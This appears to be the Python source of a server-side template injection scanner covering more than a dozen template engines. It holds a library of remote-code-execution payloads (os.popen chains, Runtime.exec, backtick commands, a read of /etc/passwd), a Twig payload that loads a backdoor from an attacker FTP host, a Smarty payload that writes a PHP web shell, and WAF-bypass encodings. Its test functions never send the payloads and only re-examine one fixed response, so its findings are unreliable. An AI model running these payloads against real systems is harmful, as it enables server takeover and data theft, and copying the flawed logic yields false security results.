from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
import re
from collections import defaultdict
import threading
import time
import hashlib
import base64
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import itertools

class SSTIType(Enum):
    JINJA2 = "jinja2"
    TWIG = "twig"
    FREEMARKER = "freemarker"
    VELOCITY = "velocity"
    THYMELEAF = "thymeleaf"
    SMARTY = "smarty"
    MAKO = "mako"
    ERB = "erb"
    HANDLEBARS = "handlebars"
    PEBBLE = "pebble"
    EXPRESSION_LANGUAGE = "expression_language"
    TORNADO = "tornado"
    DJANGO = "django"
    BLADE = "blade"

class TemplateEngine(Enum):
    PYTHON_JINJA2 = "python_jinja2"
    PYTHON_MAKO = "python_mako"
    PYTHON_TORNADO = "python_tornado"
    PYTHON_DJANGO = "python_django"
    PHP_TWIG = "php_twig"
    PHP_SMARTY = "php_smarty"
    PHP_BLADE = "php_blade"
    JAVA_FREEMARKER = "java_freemarker"
    JAVA_VELOCITY = "java_velocity"
    JAVA_THYMELEAF = "java_thymeleaf"
    JAVA_PEBBLE = "java_pebble"
    RUBY_ERB = "ruby_erb"
    NODEJS_HANDLEBARS = "nodejs_handlebars"
    NODEJS_PUG = "nodejs_pug"
    NODEJS_EJS = "nodejs_ejs"
    UNKNOWN = "unknown"

class PayloadContext(Enum):
    TEXT = "text"
    ATTRIBUTE = "attribute"
    JAVASCRIPT = "javascript"
    HTML = "html"
    URL = "url"
    JSON = "json"
    XML = "xml"

@dataclass
class SSTIPayload:
    payload: str
    ssti_type: SSTIType
    template_engine: TemplateEngine
    context: PayloadContext
    expected_output: str
    severity: str = "Critical"
    detection_patterns: List[str] = field(default_factory=list)
    requires_confirmation: bool = True
    false_positive_risk: float = 0.15

@dataclass
class SSTIVulnerability:
    vulnerability_type: str
    ssti_type: SSTIType
    template_engine: TemplateEngine
    url: str
    parameter: str
    payload: str
    severity: str
    evidence: str
    response_time: float
    expected_output: str
    actual_output: str
    code_executed: bool = False
    command_output: Optional[str] = None
    template_detected: Optional[str] = None
    confirmed: bool = False
    confidence_score: float = 0.8
    remediation: str = ""
    timestamp: float = field(default_factory=time.time)

class TemplateEngineDetector:
    ENGINE_SIGNATURES = {
        TemplateEngine.PYTHON_JINJA2: [
            r'jinja2\.', r'{% .* %}', r'{{ .* }}', r'jinja2\.exceptions',
            r'TemplateSyntaxError', r'UndefinedError', r'jinja\.environment'
        ],
        TemplateEngine.PYTHON_MAKO: [
            r'<%.*%>', r'${.*}', r'mako\.', r'MakoException', r'mako\.runtime'
        ],
        TemplateEngine.PYTHON_TORNADO: [
            r'\{\{.*\}\}', r'\{%.*%\}', r'tornado\.template'
        ],
        TemplateEngine.PYTHON_DJANGO: [
            r'\{\{.*\}\}', r'\{%.*%\}', r'django\.template', r'TemplateSyntaxError'
        ],
        TemplateEngine.PHP_TWIG: [
            r'{% .* %}', r'{{ .* }}', r'Twig\\', r'Twig_Error', r'Twig\\Error'
        ],
        TemplateEngine.PHP_SMARTY: [
            r'\{.*\}', r'Smarty', r'Smarty_Internal', r'\{\$.*\}'
        ],
        TemplateEngine.PHP_BLADE: [
            r'@if', r'@foreach', r'@section', r'blade\.php'
        ],
        TemplateEngine.JAVA_FREEMARKER: [
            r'<#.*>', r'\${.*}', r'freemarker\.', r'TemplateException'
        ],
        TemplateEngine.JAVA_VELOCITY: [
            r'#set', r'\$\{.*\}', r'velocity', r'org\.apache\.velocity'
        ],
        TemplateEngine.JAVA_THYMELEAF: [
            r'th:.*', r'thymeleaf', r'\$\{.*\}'
        ],
        TemplateEngine.JAVA_PEBBLE: [
            r'\{\{.*\}\}', r'\{%.*%\}', r'pebble'
        ],
        TemplateEngine.RUBY_ERB: [
            r'<%=.*%>', r'<%.*%>', r'erb'
        ],
        TemplateEngine.NODEJS_HANDLEBARS: [
            r'\{\{.*\}\}', r'handlebars'
        ],
        TemplateEngine.NODEJS_PUG: [
            r'pug', r'jade'
        ],
        TemplateEngine.NODEJS_EJS: [
            r'<%=.*%>', r'ejs'
        ],
    }
    
    ERROR_FINGERPRINTS = {
        'jinja2': [r'jinja2\.exceptions', r'TemplateSyntaxError', r'UndefinedError'],
        'twig': [r'Twig\\Error', r'Twig_Error_Syntax'],
        'freemarker': [r'freemarker\.core', r'TemplateException', r'ParseException'],
        'velocity': [r'org\.apache\.velocity', r'ParseException'],
        'smarty': [r'Smarty error', r'Smarty_Internal', r'Smarty_Compiler'],
        'mako': [r'MakoException', r'mako\.exceptions'],
        'erb': [r'ActionView::Template::Error'],
        'handlebars': [r'Handlebars::.*Error'],
        'thymeleaf': [r'TemplateProcessingException'],
    }
    
    @staticmethod
    def detect_template_engine(response_content: str, error_messages: str) -> Optional[TemplateEngine]:
        combined = response_content + error_messages
        scores = defaultdict(int)
        
        for engine, sigs in TemplateEngineDetector.ENGINE_SIGNATURES.items():
            for sig in sigs:
                if re.search(sig, combined, re.IGNORECASE):
                    scores[engine] += 1
        
        for error_type, patterns in TemplateEngineDetector.ERROR_FINGERPRINTS.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.IGNORECASE):
                    for engine, sigs in TemplateEngineDetector.ENGINE_SIGNATURES.items():
                        if error_type in engine.value.lower():
                            scores[engine] += 2
        
        return max(scores.items(), key=lambda x: x[1])[0] if scores else TemplateEngine.UNKNOWN
    
    @staticmethod
    def detect_from_headers(headers: Dict) -> Optional[TemplateEngine]:
        server = headers.get('Server', '').lower()
        powered = headers.get('X-Powered-By', '').lower()
        combined = server + powered
        
        mappings = {
            'flask': TemplateEngine.PYTHON_JINJA2,
            'django': TemplateEngine.PYTHON_DJANGO,
            'tornado': TemplateEngine.PYTHON_TORNADO,
            'php': TemplateEngine.PHP_TWIG,
            'laravel': TemplateEngine.PHP_BLADE,
            'symfony': TemplateEngine.PHP_TWIG,
            'java': TemplateEngine.JAVA_FREEMARKER,
            'spring': TemplateEngine.JAVA_THYMELEAF,
            'ruby': TemplateEngine.RUBY_ERB,
            'rails': TemplateEngine.RUBY_ERB,
            'express': TemplateEngine.NODEJS_HANDLEBARS,
        }
        
        for key, engine in mappings.items():
            if key in combined:
                return engine
        
        return None

class SSTIPayloadGenerator:
    DETECTION_PAYLOADS = {
        SSTIType.JINJA2: [
            ('{{7*7}}', '49'),
            ('{{7*\'7\'}}', '7777777'),
            ('{{config}}', 'Config'),
            ('{{self}}', '<'),
            ('{% for x in range(7) %}7{% endfor %}', '7777777'),
            ('{{ [].class.base.subclasses() }}', 'class'),
            ('{{request.application.__globals__.__builtins__}}', 'builtins'),
        ],
        SSTIType.TWIG: [
            ('{{7*7}}', '49'),
            ('{{7*\'7\'}}', '7777777'),
            ('{{_self}}', 'Twig'),
            ('{{dump(app)}}', 'dump'),
            ('{{constant(\'PHP_VERSION\')}}', '.'),
        ],
        SSTIType.FREEMARKER: [
            ('${7*7}', '49'),
            ('#{7*7}', '49'),
            ('${7*\'7\'}', '49'),
            ('<#assign x=7*7>${x}', '49'),
            ('${.now}', '20'),
        ],
        SSTIType.VELOCITY: [
            ('${{7*7}}', '49'),
            ('#set($x=7*7)$x', '49'),
            ('$class.inspect', 'class'),
            ('#foreach($i in [1..7])$i#end', '1234567'),
        ],
        SSTIType.SMARTY: [
            ('{7*7}', '49'),
            ('{php}echo 7*7;{/php}', '49'),
            ('{$smarty.version}', '.'),
            ('{math equation="x*y" x=7 y=7}', '49'),
        ],
        SSTIType.MAKO: [
            ('${7*7}', '49'),
            ('<%=7*7%>', '49'),
            ('${self}', 'mako'),
            ('<% import datetime %>${datetime.datetime.now()}', '20'),
        ],
        SSTIType.ERB: [
            ('<%=7*7%>', '49'),
            ('<%= 7 * 7 %>', '49'),
            ('<%=`ls`%>', 'total'),
            ('<%= File.read("/etc/passwd") %>', 'root:'),
        ],
        SSTIType.HANDLEBARS: [
            ('{{#each this}}{{@index}}{{/each}}', '0'),
            ('{{7*7}}', '49'),
        ],
        SSTIType.EXPRESSION_LANGUAGE: [
            ('${7*7}', '49'),
            ('#{7*7}', '49'),
            ('${{7*7}}', '49'),
        ],
        SSTIType.TORNADO: [
            ('{{7*7}}', '49'),
            ('{% raw 7*7 %}', '7*7'),
        ],
        SSTIType.DJANGO: [
            ('{{7|add:7}}', '14'),
            ('{% load static %}', ''),
        ],
        SSTIType.BLADE: [
            ('{{7*7}}', '49'),
            ('@php echo 7*7; @endphp', '49'),
        ],
    }
    
    RCE_PAYLOADS = {
        SSTIType.JINJA2: [
            "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        ],
        SSTIType.TWIG: [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{_self.env.setCache('ftp://attacker:2121')}}{{_self.env.loadTemplate('backdoor')}}",
            "{{['id']|filter('system')}}",
            "{{['id','']|sort('passthru')}}",
        ],
        SSTIType.FREEMARKER: [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            '<#assign classloader=object?api.class.protectionDomain.classLoader><#assign clazz=classloader.loadClass("java.lang.Runtime")><#assign clazz.getRuntime().exec("id")>',
        ],
        SSTIType.VELOCITY: [
            '#set($e="e");$e.class.forName("java.lang.Runtime").getRuntime().exec("id")',
            '#set($x=$class.inspect("java.lang.Runtime").type.getRuntime())$x.exec("id")',
        ],
        SSTIType.SMARTY: [
            '{php}system("id");{/php}',
            '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET[cmd]); ?>",self::clearConfig)}',
        ],
        SSTIType.MAKO: [
            "<%import os;os.system('id')%>",
            "${self.module.cache.util.os.system('id')}",
        ],
        SSTIType.ERB: [
            "<%=`id`%>",
            "<%=system('id')%>",
            "<%= IO.popen('id').read %>",
        ],
    }
    
    POLYGLOT_PAYLOADS = [
        "{{7*7}}[{7*7}]${7*7}<#assign x=7*7>${x}#{7*7}<%=7*7%>",
        "${{7*7}}{{7*7}}#{7*7}",
        "{{7*'7'}}${7*'7'}<%=7*7%>",
    ]
    
    WAF_BYPASS_TECHNIQUES = [
        lambda p: p.replace('{{', '{%raw%}{{'),
        lambda p: p.replace('}}', '}}%{endraw%}'),
        lambda p: p.replace(' ', '/**/'),
        lambda p: p.replace('*', '%2a'),
        lambda p: urllib.parse.quote(p),
        lambda p: base64.b64encode(p.encode()).decode(),
        lambda p: p.replace('{{', '{ {').replace('}}', '} }'),
        lambda p: ''.join([c if i % 2 == 0 else c.upper() for i, c in enumerate(p)]),
    ]
    
    @staticmethod
    def generate_detection_payloads(ssti_type: SSTIType) -> List[Tuple[str, str]]:
        return SSTIPayloadGenerator.DETECTION_PAYLOADS.get(ssti_type, [])
    
    @staticmethod
    def generate_rce_payloads(ssti_type: SSTIType) -> List[str]:
        return SSTIPayloadGenerator.RCE_PAYLOADS.get(ssti_type, [])
    
    @staticmethod
    def generate_polyglot_payloads() -> List[str]:
        return SSTIPayloadGenerator.POLYGLOT_PAYLOADS
    
    @staticmethod
    def apply_waf_bypass(payload: str) -> List[str]:
        bypassed = [payload]
        for technique in SSTIPayloadGenerator.WAF_BYPASS_TECHNIQUES:
            try:
                bypassed.append(technique(payload))
            except:
                pass
        return list(set(bypassed))

class ResponseAnalyzer:
    MATH_PATTERNS = [
        (r'\b49\b', 0.95),
        (r'\b7777777\b', 0.97),
        (r'\b343\b', 0.90),
        (r'\b14\b', 0.85),
    ]
    
    CODE_EXECUTION_PATTERNS = [
        (r'uid=\d+.*gid=\d+', 0.99),
        (r'total\s+\d+', 0.95),
        (r'drwx', 0.93),
        (r'root:', 0.98),
        (r'-rw-r--r--', 0.92),
    ]
    
    TEMPLATE_OBJECT_PATTERNS = [
        (r'<class.*>', 0.88),
        (r'Config.*object', 0.90),
        (r'builtins', 0.87),
        (r'Twig.*Environment', 0.92),
    ]
    
    @staticmethod
    def analyze_response(response_content: str, payload: str, expected_output: str) -> Tuple[bool, float, str]:
        confidence = 0.0
        evidence_parts = []
        
        if expected_output and expected_output in response_content:
            confidence = 0.97
            evidence_parts.append(f"Expected '{expected_output}' found")
        
        for pattern, score in ResponseAnalyzer.MATH_PATTERNS:
            if re.search(pattern, response_content):
                confidence = max(confidence, score)
                evidence_parts.append(f"Math result pattern: {pattern}")
        
        for pattern, score in ResponseAnalyzer.CODE_EXECUTION_PATTERNS:
            if re.search(pattern, response_content):
                confidence = max(confidence, score)
                evidence_parts.append(f"Code execution: {pattern}")
        
        for pattern, score in ResponseAnalyzer.TEMPLATE_OBJECT_PATTERNS:
            if re.search(pattern, response_content):
                confidence = max(confidence, score)
                evidence_parts.append(f"Template object: {pattern}")
        
        if len(response_content) > len(payload) * 3:
            confidence = max(confidence, 0.70)
            evidence_parts.append("Response expansion detected")
        
        payload_reflection = response_content.count(payload)
        if payload_reflection > 1:
            confidence = max(confidence, 0.65)
            evidence_parts.append(f"Payload reflected {payload_reflection} times")
        
        evidence = "; ".join(evidence_parts) if evidence_parts else "No clear evidence"
        return confidence > 0.6, confidence, evidence
    
    @staticmethod
    def extract_execution_output(response_content: str, payload: str) -> Optional[str]:
        for pattern, _ in ResponseAnalyzer.CODE_EXECUTION_PATTERNS:
            match = re.search(pattern, response_content)
            if match:
                start = max(0, match.start() - 100)
                end = min(len(response_content), match.end() + 100)
                return response_content[start:end]
        return None
    
    @staticmethod
    def compute_similarity(str1: str, str2: str) -> float:
        set1, set2 = set(str1.split()), set(str2.split())
        intersection = set1.intersection(set2)
        union = set1.union(set2)
        return len(intersection) / len(union) if union else 0.0

class ErrorMessageAnalyzer:
    ERROR_PATTERNS = {
        'jinja2': [
            r'jinja2\.exceptions\..*Error',
            r'TemplateSyntaxError.*line \d+',
            r'UndefinedError.*\'.*\' is undefined',
        ],
        'twig': [
            r'Twig\\Error\\.*Error',
            r'Twig_Error_Syntax',
            r'Unknown.*tag.*at line',
        ],
        'freemarker': [
            r'freemarker\.core\..*Exception',
            r'TemplateException.*line \d+',
            r'ParseException.*column \d+',
        ],
        'velocity': [
            r'org\.apache\.velocity\..*Exception',
            r'ParseException.*line \d+',
            r'MethodInvocationException',
        ],
        'smarty': [
            r'Smarty error:.*line \d+',
            r'Smarty_Internal.*Exception',
            r'Smarty_Compiler_Exception',
        ],
        'mako': [
            r'mako\.exceptions\..*Error',
            r'MakoException',
            r'CompileException.*line \d+',
        ],
        'erb': [
            r'ActionView::Template::Error',
            r'SyntaxError.*erb',
        ],
        'handlebars': [
            r'Handlebars::.*Error',
            r'Missing helper:',
        ],
    }
    
    @staticmethod
    def analyze_errors(response_content: str) -> Tuple[bool, Optional[str], List[str], float]:
        detected_errors = []
        detected_engine = None
        max_confidence = 0.0
        
        for engine, patterns in ErrorMessageAnalyzer.ERROR_PATTERNS.items():
            engine_confidence = 0.0
            for pattern in patterns:
                matches = re.findall(pattern, response_content, re.IGNORECASE)
                if matches:
                    detected_errors.extend(matches)
                    engine_confidence += 0.3
                    if not detected_engine:
                        detected_engine = engine
            
            max_confidence = max(max_confidence, min(engine_confidence, 1.0))
        
        return bool(detected_errors), detected_engine, detected_errors, max_confidence

class ContextAnalyzer:
    @staticmethod
    def detect_injection_context(response_content: str, payload: str) -> PayloadContext:
        if payload not in response_content:
            return PayloadContext.TEXT
        
        idx = response_content.find(payload)
        before = response_content[max(0, idx-100):idx]
        after = response_content[idx+len(payload):idx+len(payload)+100]
        
        if re.search(r'<\w+[^>]*$', before) and re.search(r'^[^<]*>', after):
            return PayloadContext.ATTRIBUTE
        
        if '<script' in before.lower() and '</script' in after.lower():
            return PayloadContext.JAVASCRIPT
        
        if 'href=' in before or 'src=' in before or 'url(' in before:
            return PayloadContext.URL
        
        if re.search(r'\{.*".*":', before) or re.search(r'".*".*\}', after):
            return PayloadContext.JSON
        
        if '<' in before and '>' in after:
            return PayloadContext.HTML
        
        return PayloadContext.TEXT
    
    @staticmethod
    def generate_context_payloads(base_payload: str, context: PayloadContext) -> List[str]:
        payloads = [base_payload]
        
        if context == PayloadContext.ATTRIBUTE:
            payloads.extend([
                f'"{base_payload}"',
                f"'{base_payload}'",
                f'x"{base_payload}',
            ])
        elif context == PayloadContext.JAVASCRIPT:
            payloads.extend([
                f"';{base_payload};//",
                f'";{base_payload};//',
            ])
        elif context == PayloadContext.URL:
            payloads.append(urllib.parse.quote(base_payload))
        
        return payloads

class SSTIScanner:
    def __init__(self):
        self.engine_detector = TemplateEngineDetector()
        self.payload_generator = SSTIPayloadGenerator()
        self.response_analyzer = ResponseAnalyzer()
        self.error_analyzer = ErrorMessageAnalyzer()
        self.context_analyzer = ContextAnalyzer()
        
        self.vulnerabilities: List[SSTIVulnerability] = []
        self.scan_statistics = defaultdict(int)
        self.baseline_responses: Dict[str, str] = {}
        self.lock = threading.Lock()
        self.max_workers = 10
    
    def scan(self, target_url: str, response: Dict, payloads: Optional[List[str]] = None) -> List[SSTIVulnerability]:
        vulnerabilities = []
        response_content = response.get('content', '')
        response_time = response.get('response_time', 0)
        status_code = response.get('status_code', 0)
        response_headers = response.get('headers', {})
        
        parameter = self._extract_parameter_name(target_url)
        baseline_response = self.baseline_responses.get(parameter, response_content)
        
        template_engine = self.engine_detector.detect_template_engine(response_content, '')
        if template_engine == TemplateEngine.UNKNOWN:
            template_engine = self.engine_detector.detect_from_headers(response_headers)
        
        ssti_types_to_test = self._determine_ssti_types_to_test(template_engine)
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for ssti_type in ssti_types_to_test:
                detection_payloads = self.payload_generator.generate_detection_payloads(ssti_type)
                
                for payload, expected_output in detection_payloads:
                    future = executor.submit(
                        self._test_single_payload,
                        target_url, parameter, payload, expected_output, ssti_type,
                        template_engine, response_content, baseline_response, response_time
                    )
                    futures.append(future)
                    
                    bypassed_payloads = self.payload_generator.apply_waf_bypass(payload)
                    for bypassed in bypassed_payloads[1:]:
                        future = executor.submit(
                            self._test_single_payload,
                            target_url, parameter, bypassed, expected_output, ssti_type,
                            template_engine, response_content, baseline_response, response_time
                        )
                        futures.append(future)
            
            for ssti_type in ssti_types_to_test:
                rce_payloads = self.payload_generator.generate_rce_payloads(ssti_type)
                for rce_payload in rce_payloads[:3]:
                    future = executor.submit(
                        self._test_rce_payload,
                        target_url, parameter, rce_payload, ssti_type,
                        template_engine, response_content, response_time
                    )
                    futures.append(future)
            
            polyglot_payloads = self.payload_generator.generate_polyglot_payloads()
            for polyglot in polyglot_payloads:
                future = executor.submit(
                    self._test_polyglot_payload,
                    target_url, parameter, polyglot, template_engine,
                    response_content, response_time
                )
                futures.append(future)
            
            for future in as_completed(futures):
                vuln = future.result()
                if vuln:
                    vulnerabilities.append(vuln)
        
        has_errors, error_engine, error_messages, error_confidence = self.error_analyzer.analyze_errors(response_content)
        if has_errors and error_confidence > 0.65:
            vuln = SSTIVulnerability(
                vulnerability_type='Server-Side Template Injection',
                ssti_type=SSTIType.JINJA2,
                template_engine=template_engine or TemplateEngine.UNKNOWN,
                url=target_url,
                parameter=parameter,
                payload='error_based_detection',
                severity='High',
                evidence=f'Template errors detected: {", ".join(error_messages[:3])}',
                response_time=response_time,
                expected_output='error',
                actual_output='; '.join(error_messages[:5]),
                template_detected=error_engine,
                confirmed=True,
                confidence_score=error_confidence,
                remediation=self._get_remediation()
            )
            vulnerabilities.append(vuln)
            with self.lock:
                self.scan_statistics['error_based'] += 1
        
        with self.lock:
            self.vulnerabilities.extend(vulnerabilities)
        
        return vulnerabilities
    
    def _test_single_payload(self, target_url: str, parameter: str, payload: str,
                            expected_output: str, ssti_type: SSTIType,
                            template_engine: TemplateEngine, response_content: str,
                            baseline_response: str, response_time: float) -> Optional[SSTIVulnerability]:
        
        is_vulnerable, confidence, evidence = self.response_analyzer.analyze_response(
            response_content, payload, expected_output
        )
        
        if not is_vulnerable:
            return None
        
        context = self.context_analyzer.detect_injection_context(response_content, payload)
        
        if confidence < 0.75 and response_content != baseline_response:
            similarity = self.response_analyzer.compute_similarity(response_content, baseline_response)
            if similarity < 0.8:
                confidence = max(confidence, 0.70)
        
        vuln = SSTIVulnerability(
            vulnerability_type='Server-Side Template Injection',
            ssti_type=ssti_type,
            template_engine=template_engine or TemplateEngine.UNKNOWN,
            url=target_url,
            parameter=parameter,
            payload=payload,
            severity='Critical',
            evidence=evidence,
            response_time=response_time,
            expected_output=expected_output,
            actual_output=response_content[:300],
            template_detected=template_engine.value if template_engine else None,
            confirmed=confidence > 0.85,
            confidence_score=confidence,
            remediation=self._get_remediation()
        )
        
        if self._is_valid_vulnerability(vuln):
            with self.lock:
                self.scan_statistics[ssti_type.value] += 1
            return vuln
        
        return None
    
    def _test_rce_payload(self, target_url: str, parameter: str, payload: str,
                         ssti_type: SSTIType, template_engine: TemplateEngine,
                         response_content: str, response_time: float) -> Optional[SSTIVulnerability]:
        
        command_output = self.response_analyzer.extract_execution_output(response_content, payload)
        
        if command_output:
            vuln = SSTIVulnerability(
                vulnerability_type='Server-Side Template Injection',
                ssti_type=ssti_type,
                template_engine=template_engine or TemplateEngine.UNKNOWN,
                url=target_url,
                parameter=parameter,
                payload=payload,
                severity='Critical',
                evidence='Remote code execution confirmed',
                response_time=response_time,
                expected_output='command_output',
                actual_output=command_output,
                code_executed=True,
                command_output=command_output,
                confirmed=True,
                confidence_score=0.99,
                remediation=self._get_remediation()
            )
            
            with self.lock:
                self.scan_statistics['rce_confirmed'] += 1
            
            return vuln
        
        return None
    
    def _test_polyglot_payload(self, target_url: str, parameter: str, payload: str,
                               template_engine: TemplateEngine, response_content: str,
                               response_time: float) -> Optional[SSTIVulnerability]:
        
        is_vulnerable, confidence, evidence = self.response_analyzer.analyze_response(
            response_content, payload, '49'
        )
        
        if is_vulnerable and confidence > 0.75:
            vuln = SSTIVulnerability(
                vulnerability_type='Server-Side Template Injection',
                ssti_type=SSTIType.JINJA2,
                template_engine=template_engine or TemplateEngine.UNKNOWN,
                url=target_url,
                parameter=parameter,
                payload=payload,
                severity='Critical',
                evidence=f'Polyglot payload successful: {evidence}',
                response_time=response_time,
                expected_output='49',
                actual_output=response_content[:200],
                confirmed=True,
                confidence_score=confidence,
                remediation=self._get_remediation()
            )
            
            with self.lock:
                self.scan_statistics['polyglot'] += 1
            
            return vuln
        
        return None
    
    def _determine_ssti_types_to_test(self, template_engine: Optional[TemplateEngine]) -> List[SSTIType]:
        if not template_engine or template_engine == TemplateEngine.UNKNOWN:
            return list(SSTIType)
        
        engine_mapping = {
            TemplateEngine.PYTHON_JINJA2: [SSTIType.JINJA2],
            TemplateEngine.PYTHON_MAKO: [SSTIType.MAKO],
            TemplateEngine.PYTHON_TORNADO: [SSTIType.TORNADO],
            TemplateEngine.PYTHON_DJANGO: [SSTIType.DJANGO],
            TemplateEngine.PHP_TWIG: [SSTIType.TWIG],
            TemplateEngine.PHP_SMARTY: [SSTIType.SMARTY],
            TemplateEngine.PHP_BLADE: [SSTIType.BLADE],
            TemplateEngine.JAVA_FREEMARKER: [SSTIType.FREEMARKER],
            TemplateEngine.JAVA_VELOCITY: [SSTIType.VELOCITY],
            TemplateEngine.JAVA_THYMELEAF: [SSTIType.THYMELEAF],
            TemplateEngine.JAVA_PEBBLE: [SSTIType.PEBBLE],
            TemplateEngine.RUBY_ERB: [SSTIType.ERB],
            TemplateEngine.NODEJS_HANDLEBARS: [SSTIType.HANDLEBARS],
        }
        
        return engine_mapping.get(template_engine, list(SSTIType))
    
    def _extract_parameter_name(self, url: str) -> str:
        from urllib.parse import urlparse, parse_qs
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys())[0] if params else 'parameter'
    
    def _is_valid_vulnerability(self, vuln: SSTIVulnerability) -> bool:
        if vuln.confidence_score < 0.60:
            return False
        
        if any(word in vuln.payload.lower() for word in ['test', 'debug', 'sample', 'example']):
            if vuln.confidence_score < 0.90:
                return False
        
        return vuln.confirmed or vuln.code_executed or vuln.confidence_score > 0.85
    
    def _get_remediation(self) -> str:
        return (
            "1. Use sandboxed template engines with restricted functionality. "
            "2. Never pass user input directly to template rendering functions. "
            "3. Implement strict input validation and sanitization. "
            "4. Enable auto-escaping in template engines. "
            "5. Disable or remove dangerous template functions and filters. "
            "6. Use logic-less template engines when possible (Mustache, Handlebars in safe mode). "
            "7. Implement Content Security Policy (CSP) headers. "
            "8. Run template rendering in isolated, sandboxed environments. "
            "9. Regularly update template engine libraries to latest versions. "
            "10. Monitor and log template injection attempts. "
            "11. Use template precompilation where possible. "
            "12. Implement rate limiting on template rendering endpoints."
        )
    
    def get_vulnerabilities(self) -> List[SSTIVulnerability]:
        with self.lock:
            return self.vulnerabilities.copy()
    
    def get_statistics(self) -> Dict[str, int]:
        with self.lock:
            return dict(self.scan_statistics)
    
    def set_baseline_response(self, parameter: str, response: str):
        self.baseline_responses[parameter] = response
    
    def get_baseline_response(self, parameter: str) -> Optional[str]:
        return self.baseline_responses.get(parameter)
    
    def clear(self):
        with self.lock:
            self.vulnerabilities.clear()
            self.scan_statistics.clear()
            self.baseline_responses.clear()
